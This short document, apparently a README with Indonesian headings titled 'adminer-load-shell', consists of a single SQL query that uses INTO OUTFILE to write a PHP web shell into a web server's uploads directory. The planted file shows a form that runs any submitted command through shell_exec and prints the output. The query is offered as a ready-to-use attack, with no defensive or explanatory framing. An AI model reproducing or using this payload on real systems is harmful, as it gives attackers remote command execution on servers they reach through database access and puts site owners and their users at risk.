# adminer-load-shell


Query SQL
=====================
Query SQL untuk Menulis CMD ke File
sql
Salin kode
SELECT '<?php
if (isset($_POST["submit"])) {
    $cmd = $_POST["cmd"];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>

<form action="" method="post">
    <input type="text" name="cmd" placeholder="Enter command" size="50" required>
    <input type="submit" name="submit" value="Execute">
</form>' INTO OUTFILE '/var/www/html/web/uploads/cmd.php'
FIELDS TERMINATED BY '' LINES TERMINATED BY '';
